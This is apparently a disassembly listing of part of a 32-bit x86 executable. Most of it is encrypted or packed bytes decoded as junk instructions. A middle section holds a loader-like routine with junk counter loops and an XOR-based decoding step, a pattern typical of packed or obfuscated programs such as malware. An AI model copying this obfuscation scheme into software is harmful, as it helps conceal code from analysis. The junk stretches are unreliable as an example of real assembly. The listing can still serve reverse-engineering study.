  40fc7d:	sahf   
  40fc7e:	maskmovq mm6,(bad)
  40fc7f:	div    DWORD PTR [ecx+0x4e]
  40fc82:	(bad)  
  40fc83:	inc    esi
  40fc84:	(bad)  
  40fc85:	in     al,dx
  40fc86:	sub    al,0xb
  40fc88:	push   ss
  40fc89:	push   es
  40fc8a:	and    al,0x5e
  40fc8c:	sahf   
  40fc8d:	cdq    
  40fc8e:	sub    al,BYTE PTR [edi+0x16f67955]
  40fc94:	jecxz  0x40fc25
  40fc96:	inc    ecx
  40fc97:	sbb    edi,DWORD PTR [esi-0x4f6407ca]
  40fc9d:	add    bh,BYTE PTR [esi+0x5b47996c]
  40fca3:	cbw    
  40fca5:	jns    0x40fc5e
  40fca7:	xchg   edx,eax
  40fca8:	sbb    al,0x3a
  40fcaa:	ds and bh,ch
  40fcad:	out    dx,eax
  40fcae:	dec    ecx
  40fcaf:	out    0xe0,eax
  40fcb1:	fisttp WORD PTR [eax+0x5df16ec2]
  40fcb7:	imul   ebx,DWORD PTR [eax-0x758d5b81],0x48
  40fcbe:	inc    ecx
  40fcbf:	cmp    cl,bl
  40fcc1:	addr16 aas 
  40fcc3:	mov    ?,WORD PTR [ebx]
  40fcc5:	pop    ecx
  40fcc6:	add    eax,0x14a63fd9
  40fccb:	xchg   edx,eax
  40fccc:	lods   eax,DWORD PTR ds:[esi]
  40fccd:	push   cs
  40fcce:	repz gs xchg ebp,eax
  40fcd1:	iret   
  40fcd2:	mov    edx,DWORD PTR [edi+0x1f100f4]
  40fcd8:	cmp    DWORD PTR [ebx],edi
  40fcda:	xor    al,0x27
  40fcdc:	mov    bh,0x83
  40fcde:	mov    WORD PTR [edi-0x11d0c440],ds
  40fce4:	mov    ah,0x15
  40fce6:	scas   eax,DWORD PTR es:[edi]
  40fce7:	lahf   
  40fce8:	xchg   esp,eax
  40fce9:	pushf  
  40fcea:	cmp    ebx,DWORD PTR [esi-0x11eee131]
  40fcf0:	adc    eax,0x66bf19a9
  40fcf5:	push   0xffffffab
  40fcf7:	ins    DWORD PTR es:[edi],dx
  40fcf8:	jne    0x40fc92
  40fcfa:	cmc    
  40fcfb:	push   ebp
  40fcfc:	and    al,0x50
  40fcfe:	test   DWORD PTR [eax+0xb728ad7],0x451a689d
  40fd08:	sbb    al,0x56
  40fd0a:	inc    eax
  40fd0b:	cmc    
  40fd0c:	mov    cs,WORD PTR [esi+edx*2-0x13691291]
  40fd13:	cmc    
  40fd14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd15:	adc    DWORD PTR [ebp+0x54],edx
  40fd18:	jecxz  0x40fd6a
  40fd1a:	adc    eax,0xcfc7a7f6
  40fd1f:	in     al,dx
  40fd20:	mov    esp,ecx
  40fd22:	xor    esi,edx
  40fd24:	or     ch,0x66
  40fd27:	add    DWORD PTR [ebp+0x157aad03],edx
  40fd2d:	cmp    ah,BYTE PTR [esi]
  40fd2f:	or     DWORD PTR [ebx-0x36],ebx
  40fd32:	ds rol ah,1
  40fd35:	jl     0x40fd2c
  40fd37:	rcr    DWORD PTR [edx-0x46],cl
  40fd3a:	mov    edx,esp
  40fd3c:	cmp    DWORD PTR [ebp+0x3a],esp
  40fd3f:	cmp    al,0x9
  40fd41:	mov    cl,0x2a
  40fd43:	je     0x40fcf5
  40fd45:	mov    ebp,0xd727fe1b
  40fd4a:	fdiv   QWORD PTR [ebp-0x75]
  40fd4d:	fwait
  40fd4e:	mov    ch,0x4c
  40fd50:	repz add edi,DWORD PTR [eax+0x6a]
  40fd54:	test   BYTE PTR [edi+0x73],0x12
  40fd58:	test   BYTE PTR [ebx+0x4dbdf62a],dl
  40fd5e:	loopne 0x40fdd0
  40fd60:	push   es
  40fd61:	or     dl,BYTE PTR [esi+0x5368d949]
  40fd67:	add    BYTE PTR [esi-0x6d],cl
  40fd6a:	adc    BYTE PTR [ebp-0x1faf2c6e],dl
  40fd70:	mov    BYTE PTR [eax-0x75],cl
  40fd73:	ja     0x40fd2f
  40fd75:	out    dx,eax
  40fd76:	jp     0x40fdce
  40fd78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd79:	push   ss
  40fd7a:	mov    bl,dl
  40fd7c:	in     al,0x2a
  40fd7e:	xchg   eax,ecx
  40fd80:	repnz faddp st(3),st
  40fd83:	imul   edx,DWORD PTR [edi+eax*8+0x48],0x43cf2df4
  40fd8b:	or     ah,dh
  40fd8d:	(bad)  
  40fd8e:	inc    ecx
  40fd8f:	nop
  40fd90:	xchg   ecx,eax
  40fd91:	(bad)  
  40fd92:	pop    ecx
  40fd93:	push   edi
  40fd94:	cwde   
  40fd95:	xchg   edx,eax
  40fd96:	fsubp  st(4),st
  40fd98:	retf   0x7a35
  40fd9b:	mov    al,ds:0x91b6f18
  40fda0:	and    DWORD PTR [esi-0x152aa519],0x593ed0b5
  40fdaa:	repnz outs dx,DWORD PTR ds:[esi]
  40fdac:	mov    edi,0x9702dc9d
  40fdb1:	sbb    BYTE PTR [ecx],ch
  40fdb3:	adc    dl,ah
  40fdb5:	mov    eax,ds:0x2ca32182
  40fdba:	cmp    DWORD PTR [ebp+esi*2+0x7c1097e1],0x49
  40fdc2:	jnp    0x40fdc8
  40fdc4:	inc    ecx
  40fdc5:	mov    ds:0xc417033f,eax
  40fdca:	adc    al,BYTE PTR [ebx+0x44316472]
  40fdd0:	adc    bh,BYTE PTR [edx-0x3a]
  40fdd3:	mov    ecx,0x3a7526e8
  40fdd8:	cdq    
  40fdd9:	and    DWORD PTR [edi+eax*1-0x3c],ebp
  40fddd:	jecxz  0x40fe17
  40fddf:	cmp    BYTE PTR [edx+0x53],0x45
  40fde3:	test   edx,eax
  40fde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fde6:	sahf   
  40fde7:	repz fistp WORD PTR [eax]
  40fdea:	xor    BYTE PTR [ebp+0x1cc819e4],ch
  40fdf0:	sub    DWORD PTR [esi-0x5d],eax
  40fdf3:	push   esi
  40fdf4:	es and esi,eax
  40fdf7:	popa   
  40fdf8:	fistp  DWORD PTR [ecx-0x3764edf9]
  40fdfe:	xchg   edi,eax
  40fdff:	in     al,dx
  40fe00:	mov    edx,?
  40fe02:	(bad)  
  40fe03:	out    dx,al
  40fe04:	jle    0x40fdaa
  40fe06:	adc    BYTE PTR [ebp+0x6d0c92fd],ah
  40fe0c:	mov    ?,eax
  40fe0e:	mov    ebp,0x24c66906
  40fe13:	inc    ebp
  40fe14:	dec    eax
  40fe15:	mov    ah,0x3f
  40fe17:	psrld  mm3,QWORD PTR [eax]
  40fe1a:	push   eax
  40fe1b:	loopne 0x40fda1
  40fe1d:	and    ebp,DWORD PTR [eax+0x1971cadc]
  40fe23:	ror    DWORD PTR [eax+edx*1],cl
  40fe26:	push   esi
  40fe27:	jnp    0x40fdd6
  40fe29:	xor    DWORD PTR [esi+0x32],0x27
  40fe2d:	adc    esp,0xc96afc04
  40fe33:	inc    ecx
  40fe34:	outs   dx,BYTE PTR ds:[esi]
  40fe35:	pushf  
  40fe36:	mov    bl,0xa8
  40fe38:	cmp    DWORD PTR [ecx+eiz*2-0x1596bf3b],esp
  40fe3f:	cwde   
  40fe40:	fidiv  WORD PTR [ebp+eax*4+0x78bd683a]
  40fe47:	std    
  40fe48:	add    bl,BYTE PTR [ebx+0x1a]
  40fe4b:	sbb    DWORD PTR [ebp-0x33c71d9c],0xa71b4898
  40fe55:	push   edx
  40fe56:	inc    esi
  40fe57:	add    BYTE PTR [edx],al
  40fe59:	add    ah,ch
  40fe5b:	jo     0x40fe22
  40fe5d:	rcr    DWORD PTR [ebx],1
  40fe5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe60:	jno    0x40feca
  40fe62:	cmc    
  40fe63:	ret    0x559e
  40fe66:	mov    bh,0xa6
  40fe68:	adc    DWORD PTR [edx-0x26],eax
  40fe6b:	dec    esi
  40fe6c:	mov    ebx,0xf782e6f4
  40fe71:	jge    0x40fe0a
  40fe73:	scas   eax,DWORD PTR es:[edi]
  40fe74:	jo     0x40fe30
  40fe76:	int    0x75
  40fe78:	les    edi,FWORD PTR [edx-0x5d]
  40fe7b:	xchg   ebp,eax
  40fe7c:	xchg   esi,eax
  40fe7d:	rcl    DWORD PTR [edi-0xc],0x7d
  40fe81:	ret    0xeff4
  40fe84:	mov    ch,cl
  40fe86:	bound  esi,QWORD PTR [edx]
  40fe88:	push   0xffffff95
  40fe8a:	cwde   
  40fe8b:	mov    ch,0xc9
  40fe8d:	push   ebx
  40fe8e:	dec    ebp
  40fe8f:	enter  0x444d,0xca
  40fe93:	aaa    
  40fe94:	sbb    BYTE PTR [ebx+0x462ed949],0x96
  40fe9b:	and    al,0x9f
  40fe9d:	sahf   
  40fe9e:	sub    DWORD PTR [edi],ebx
  40fea0:	mov    esi,edi
  40fea2:	xlat   BYTE PTR ds:[ebx]
  40fea3:	jnp    0x40fe94
  40fea5:	daa    
  40fea6:	jbe    0x40ff15
  40fea8:	pusha  
  40fea9:	into   
  40feaa:	mov    esi,0xe6ea28be
  40feaf:	xchg   edx,eax
  40feb0:	adc    al,0x2b
  40feb3:	sub    DWORD PTR [ebx+0x44],edi
  40feb6:	push   es
  40feb7:	pushf  
  40feb8:	push   esp
  40feb9:	outs   dx,DWORD PTR ds:[esi]
  40feba:	iret   
  40febb:	mov    ah,0x6e
  40febd:	mov    al,ds:0xc0042b7f
  40fec2:	nop
  40fec3:	dec    edx
  40fec4:	aaa    
  40fec5:	adc    BYTE PTR [edx-0x7465d982],ah
  40fecb:	repz leave 
  40fecd:	test   dh,bh
  40fecf:	shl    DWORD PTR [eax-0x56eb6c3c],cl
  40fed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x6e944346
  40fef3:	cmp    dl,BYTE PTR [ecx+0x7e7eb5de]
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fefe:	into   
  40feff:	inc    ebp
  40ff00:	jl     0x40ff45
  40ff02:	sar    ecx,1
  40ff04:	int    0x2e
  40ff06:	push   edx
  40ff07:	out    0x33,al
  40ff09:	xor    eax,0x5cc275cf
  40ff0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff0f:	rcr    BYTE PTR [esi],0xd1
  40ff12:	sbb    DWORD PTR ds:0x5e70f0f,esi
  40ff18:	xor    cl,BYTE PTR [edi]
  40ff1a:	and    dl,BYTE PTR [esi+0x54]
  40ff1d:	dec    esp
  40ff1e:	rcr    DWORD PTR [edx],0x8f
  40ff21:	fist   DWORD PTR [eax-0x1e]
  40ff24:	mul    BYTE PTR [ecx-0x67]
  40ff27:	mov    ds:0x25496d73,al
  40ff2c:	stos   BYTE PTR es:[edi],al
  40ff2d:	call   0x4be5:0x6553bb19
  40ff34:	xor    BYTE PTR [esi+eax*1+0x70],0xbb
  40ff39:	xchg   edx,eax
  40ff3a:	stos   DWORD PTR es:[edi],eax
  40ff3b:	sbb    eax,0x4f726f40
  40ff40:	sbb    DWORD PTR [eax],edi
  40ff42:	aas    
  40ff43:	repz dec ecx
  40ff45:	retf   0x1394
  40ff48:	inc    ebx
  40ff49:	mov    edx,0x6815d840
  40ff4e:	adc    al,0xde
  40ff50:	test   edx,ebx
  40ff52:	jmp    0x40ff71
  40ff54:	(bad)  
  40ff55:	sbb    bh,BYTE PTR [esi-0x411e258a]
  40ff5b:	mov    eax,0xf83e1726
  40ff60:	out    0xa0,eax
  40ff62:	mov    al,ds:0xf3027606
  40ff67:	push   eax
  40ff68:	push   ebp
  40ff69:	mov    ebp,0xe02eaf68
  40ff6e:	arpl   WORD PTR [esi],bx
  40ff70:	mov    dh,0xfc
  40ff72:	jb     0x40ff7f
  40ff74:	mov    ds:0xe22bd3e5,eax
  40ff79:	stos   DWORD PTR es:[edi],eax
  40ff7a:	sub    BYTE PTR [eax+edx*2],bh
  40ff7d:	mov    ecx,0x7477a441
  40ff82:	daa    
  40ff83:	push   edi
  40ff84:	loope  0x40ff10
  40ff86:	call   0x795b:0xc57d5b7f
  40ff8d:	or     BYTE PTR ds:0x1784a647,cl
  40ff93:	out    0x54,al
  40ff95:	xor    bl,BYTE PTR ds:0xf47826de
  40ff9b:	out    dx,eax
  40ff9c:	inc    BYTE PTR [edi-0x208b9c12]
  40ffa2:	out    0x58,al
  40ffa4:	nop
  40ffa5:	lock inc eax
  40ffa7:	dec    ecx
  40ffa8:	sbb    eax,0x921e5a38
  40ffad:	push   0xffffffa3
  40ffaf:	(bad)  
  40ffb0:	call   0x52cf:0x4b2b9b1b
  40ffb7:	in     eax,dx
  40ffb8:	pushf  
  40ffb9:	mov    edi,0xeaa9cb7a
  40ffbe:	ds add DWORD PTR gs:[edi-0x5c],ecx
  40ffc3:	repnz fisub DWORD PTR [esi]
  40ffc6:	adc    DWORD PTR [ecx],ebp
  40ffc8:	in     al,0x48
  40ffca:	shl    BYTE PTR [ebp-0x651748e1],0x9d
  40ffd1:	popa   
  40ffd2:	adc    BYTE PTR [edx+ebx*4-0x6487939d],al
  40ffd9:	or     DWORD PTR [ebp-0x63],esi
  40ffdc:	aas    
  40ffdd:	pop    eax
  40ffde:	push   ebp
  40ffdf:	mov    dl,0x3f
  40ffe1:	jl     0x41003d
  40ffe3:	dec    ebp
  40ffe4:	push   ds
  40ffe5:	jne    0x41003e
  40ffe7:	or     DWORD PTR [ebp+edx*4+0x7fead120],edx
  40ffee:	mov    cl,0xda
  40fff0:	mov    eax,0xda490889
  40fff5:	inc    edx
  40fff6:	push   esi
  40fff7:	ficom  WORD PTR [ecx]
  40fff9:	inc    ecx
  40fffa:	int3   
  40fffb:	mov    ds:0xa99e1680,al
  410000:	or     dl,BYTE PTR [ecx+0x14086f74]
  410006:	dec    ebp
  410007:	inc    ebp
  410008:	inc    esi
  410009:	fidivr WORD PTR [eax+edi*2+0x54b4dc26]
  410010:	lds    ebp,FWORD PTR [ebp+0x13]
  410013:	(bad)  
  410014:	(bad)  
  410015:	ror    BYTE PTR [ebp-0x35],cl
  410018:	iret   
  410019:	ds pop ebx
  41001b:	or     DWORD PTR [edi+0x2f35ede8],ebp
  410021:	sub    BYTE PTR [ecx],0x3c
  410024:	out    0xc3,eax
  410026:	push   edx
  410027:	into   
  410028:	lock jmp 0x4100a1
  41002b:	jmp    0x410060
  41002d:	or     BYTE PTR [ebp-0x36],bh
  410030:	loopne 0x410063
  410032:	adc    eax,0x1d421521
  410037:	xor    al,0xd8
  410039:	test   BYTE PTR [ebx+0x63],al
  41003c:	popa   
  41003d:	jo     0x410092
  41003f:	int3   
  410040:	mov    DWORD PTR [esi],ebx
  410042:	sahf   
  410043:	das    
  410044:	and    eax,0xb2c36428
  410049:	sub    ebp,edi
  41004b:	sub    eax,0x8004e3aa
  410050:	in     al,0x7e
  410052:	out    dx,eax
  410053:	and    al,BYTE PTR [esi+0x3d13d300]
  410059:	pop    es
  41005a:	jl     0x4100a4
  41005c:	in     eax,0xdb
  41005e:	xchg   esp,eax
  41005f:	outs   dx,BYTE PTR ds:[esi]
  410060:	jmp    0x338417ee
  410065:	(bad)  
  410066:	daa    
  410067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410068:	sub    BYTE PTR [edx],ah
  41006a:	nop
  41006b:	daa    
  41006c:	inc    ebx
  41006d:	inc    ecx
  41006e:	sti    
  41006f:	retf   
  410070:	add    edi,DWORD PTR [eax-0x67]
  410073:	xchg   ebx,eax
  410074:	mov    eax,ds:0xd057d4aa
  410079:	sub    BYTE PTR [ebx+0x77],0x29
  41007d:	sub    al,0x13
  41007f:	mov    ah,0x3f
  410081:	or     eax,0x58d06489
  410086:	push   es
  410087:	xchg   edx,eax
  410088:	sub    esp,0x38
  41008b:	test   DWORD PTR [edi+esi*1],ebp
  41008e:	push   0xd5afc52
  410093:	fdivr  QWORD PTR [eax+edx*4-0x61]
  410097:	mov    ecx,DWORD PTR ds:0x6adac4ee
  41009d:	fidivr DWORD PTR [esi]
  41009f:	retf   0x36b2
  4100a2:	xor    al,0x56
  4100a4:	cmp    ebx,DWORD PTR [edx-0x387de72a]
  4100aa:	rcr    DWORD PTR [ecx-0x51],1
  4100ad:	push   ebx
  4100ae:	cmp    BYTE PTR [edi],bh
  4100b0:	lods   eax,DWORD PTR ds:[esi]
  4100b1:	mov    ch,0xbf
  4100b3:	pop    es
  4100b4:	lods   al,BYTE PTR ds:[esi]
  4100b5:	xchg   esi,eax
  4100b6:	push   cs
  4100b7:	pop    es
  4100b8:	jb     0x4100e1
  4100ba:	sar    BYTE PTR [ecx+0x49],1
  4100bd:	push   esp
  4100be:	xchg   ebx,eax
  4100bf:	lods   eax,DWORD PTR ds:[esi]
  4100c0:	cmp    ebp,ebp
  4100c2:	xchg   edx,eax
  4100c3:	(bad)  
  4100c4:	add    DWORD PTR [ebp-0x5d],ebx
  4100c7:	cmp    DWORD PTR [eax],ebp
  4100c9:	xchg   edx,eax
  4100ca:	or     al,BYTE PTR [eax]
  4100cc:	scas   al,BYTE PTR es:[edi]
  4100cd:	push   ebp
  4100ce:	jp     0x4100c9
  4100d0:	fwait
  4100d1:	out    dx,al
  4100d2:	loope  0x410131
  4100d4:	inc    ecx
  4100d5:	add    esi,ecx
  4100d7:	xchg   esp,eax
  4100d8:	push   ss
  4100d9:	repz and ebp,DWORD PTR [ebp-0x510c29aa]
  4100e0:	shr    DWORD PTR [esi-0x19],0x53
  4100e4:	jnp    0x4100b0
  4100e6:	outs   dx,BYTE PTR ds:[esi]
  4100e7:	in     eax,0x17
  4100e9:	(bad)  
  4100ea:	arpl   WORD PTR [ebx+0x40742f91],sp
  4100f0:	dec    ebp
  4100f1:	push   edx
  4100f2:	jg     0x41016e
  4100f4:	push   ss
  4100f5:	push   esp
  4100f6:	or     esi,DWORD PTR [edx-0x49]
  4100f9:	popa   
  4100fa:	add    eax,0x63ab155d
  4100ff:	pop    ds
  410100:	xchg   edx,eax
  410101:	inc    eax
  410102:	adc    BYTE PTR [ecx],bh
  410104:	mov    dl,0x60
  410106:	into   
  410107:	int    0xc
  410109:	jo     0x4100b5
  41010b:	jmp    0x4100e5
  41010d:	sbb    ebx,DWORD PTR ds:0x1cc24e2d
  410113:	mov    fs,WORD PTR [ebp-0x716040c3]
  410119:	in     eax,dx
  41011a:	adc    al,0x65
  41011c:	mov    edx,0x5e2fd6ef
  410121:	int3   
  410122:	pop    ebp
  410123:	pushf  
  410124:	xchg   edi,eax
  410125:	lds    esp,FWORD PTR [esp+edx*2-0x6dbeb05a]
  41012c:	xchg   DWORD PTR [ebx+0x2a5140cf],esp
  410132:	leave  
  410133:	test   al,0xa9
  410135:	inc    edx
  410136:	xor    ch,BYTE PTR [ebx+0x674b5c88]
  41013c:	(bad)  
  41013d:	aaa    
  41013e:	icebp  
  41013f:	xchg   edi,eax
  410140:	jb     0x4100e9
  410142:	retf   0x9509
  410145:	dec    edi
  410146:	xchg   ecx,eax
  410147:	cmp    bl,0xd7
  41014a:	sbb    eax,0x62b1a340
  41014f:	push   ss
  410150:	call   0x5b4f:0xfcef323a
  410157:	sub    esi,edx
  410159:	dec    esi
  41015a:	cmp    BYTE PTR [edi+ecx*2+0x28c7fe60],bl
  410161:	push   ecx
  410162:	dec    esp
  410163:	cmp    BYTE PTR [esi],ah
  410165:	nop
  410166:	mov    ecx,ecx
  410168:	fwait
  410169:	adc    esi,ebp
  41016b:	lock out 0xb1,al
  41016e:	rol    BYTE PTR [edi-0x2e],cl
  410171:	mov    ds:0x1b5e3c7c,al
  410176:	(bad)  [esi-0x3a]
  410179:	mov    edi,esp
  41017b:	js     0x4101b4
  41017d:	fwait
  41017e:	int    0x5e
  410180:	sbb    esp,DWORD PTR [eax-0x60]
  410183:	ja     0x4101e5
  410185:	test   BYTE PTR [edi],ah
  410187:	push   ss
  410188:	lahf   
  410189:	pop    ss
  41018a:	and    ebp,DWORD PTR [eax]
  41018c:	pushf  
  41018d:	pop    ebp
  41018e:	mov    ecx,0x449b18b5
  410193:	popf   
  410194:	dec    edi
  410195:	and    eax,0x8aeda5b8
  41019a:	call   0x950:0xb23412cc
  4101a1:	and    BYTE PTR [ecx-0x40],bl
  4101a4:	sub    bh,BYTE PTR [edx-0x133b077a]
  4101aa:	xchg   edx,eax
  4101ab:	aam    0xfa
  4101ad:	and    esp,ebx
  4101af:	jno    0x41015b
  4101b1:	sbb    eax,0x25511747
  4101b6:	mov    bl,0xa9
  4101b8:	jmp    0x1d9b:0xaf31eb3d
  4101bf:	popa   
  4101c0:	das    
  4101c1:	(bad)  
  4101c2:	pop    ecx
  4101c3:	dec    edx
  4101c4:	stc    
  4101c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101c6:	mov    bl,0x55
  4101c8:	jae    0x41018e
  4101ca:	imul   edi,DWORD PTR [esi+0x58],0xffffffe3
  4101ce:	mov    bh,0x4a
  4101d0:	pop    ecx
  4101d1:	lods   eax,DWORD PTR ds:[esi]
  4101d2:	mov    ah,0x1a
  4101d4:	scas   al,BYTE PTR es:[edi]
  4101d5:	cmp    al,0x9c
  4101d7:	mul    DWORD PTR [eax+0x75]
  4101da:	sub    edi,ecx
  4101dc:	sbb    eax,0x1b8c0f5f
  4101e1:	ret    0xb681
  4101e4:	call   0xc3f8f430
  4101e9:	inc    eax
  4101ea:	inc    esi
  4101eb:	ret    
  4101ec:	imul   ebp,DWORD PTR [edi-0x3a7b499a],0xeaf8e00e
  4101f6:	pusha  
  4101f7:	adc    eax,0xd12b57ba
  4101fc:	retf   0x3293
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43381f
  41021e:	adc    DWORD PTR ds:0x433857,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43378b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4338ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43385f
  41026b:	or     DWORD PTR ds:0x433857,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43382b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43382b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43382b,ecx
  410291:	cmp    DWORD PTR ds:0x43382b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43382b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43382b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43382b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43382b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433783
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433867,0x43381f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433863,0x433817
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4337d7
  41031a:	sub    DWORD PTR ds:0x43379f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4337db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4337db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4337db,ecx
  410345:	cmp    DWORD PTR ds:0x4337db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43392f
  410357:	push   0x43396f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4337db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43381f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433893,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433893
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433893,ecx
  41038f:	cmp    DWORD PTR ds:0x433893,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433867
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433893,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433893
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433893,ecx
  4103c8:	cmp    DWORD PTR ds:0x433893,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4337df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4337d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4337d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4337d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4337d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4337d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x35,al
  41049c:	adc    ebp,edi
  41049e:	pusha  
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	gs fs mov esp,0x87f7080b
  4104ae:	fsubr  DWORD PTR [ecx-0x21bf4a4b]
  4104b4:	push   edx
  4104b5:	int3   
  4104b6:	das    
  4104b7:	pushf  
  4104b8:	(bad)  
  4104b9:	sahf   
  4104ba:	mov    edi,?
  4104bc:	inc    esp
  4104bd:	pop    ebp
  4104be:	aad    0xdc
  4104c0:	in     al,dx
  4104c1:	inc    edx
  4104c2:	aad    0x5a
  4104c4:	outs   dx,DWORD PTR ds:[esi]
  4104c5:	xchg   ebp,eax
  4104c6:	sahf   
  4104c7:	ret    0x5c18
  4104ca:	xor    al,0x46
  4104cc:	xchg   esp,eax
  4104cd:	jecxz  0x410455
  4104cf:	les    eax,FWORD PTR [edi-0x5cc3724]
  4104d5:	mov    ch,0xe9
  4104d7:	xchg   ecx,eax
  4104d8:	out    0x26,eax
  4104da:	push   esi
  4104db:	stos   DWORD PTR es:[edi],eax
  4104dc:	dec    esp
  4104dd:	gs mov bl,0x74
  4104e0:	mov    ecx,0x109f46a8
  4104e5:	cmp    eax,0xff21583d
  4104ea:	call   DWORD PTR [ebp+0x58]
  4104ed:	add    eax,0xe3d8a000
  4104f2:	xchg   DWORD PTR [ecx+0x4d],ebx
  4104f5:	std    
  4104f6:	ror    BYTE PTR [edx],cl
  4104f8:	mov    edi,0x8e125a6e
